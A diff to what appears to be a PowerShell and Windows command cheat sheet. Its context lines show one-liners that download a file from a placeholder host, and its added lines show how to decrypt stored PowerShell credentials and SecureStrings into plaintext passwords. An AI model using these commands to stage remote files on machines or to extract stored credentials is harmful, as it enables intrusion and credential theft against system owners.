@@ -28,3 +28,13 @@ attrib -h -r -s /s /d C:\*.* (The C drive can be changed to any drive of your ch
 powershell.exe -command (New-Object System.Net.Webclient).DownloadFile("http://ip address/domain:port/file","download location's full path\programname.extension")<br />
 powershell Invoke-Webrequest -OutFile 'Dstn path.Extension' -Uri http://ip address/domain:port/file
 
+## Decrypting Powershell SecureString (ONLY WORKS WHEN YOU ARE THE OWNER OF THE XML FILE)
+### If you have a xml object file
+
+$credential = Import-CliXml -Path  <PathToXml>\MyCredential.xml <br />
+$credential.GetNetworkCredential().Password <br />
+
+### If you have a single string
+
+$secretStuff = Get-Content  -Path secretstuff.txt | ConvertTo-SecureString <br />
+[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((($secretStuff))))
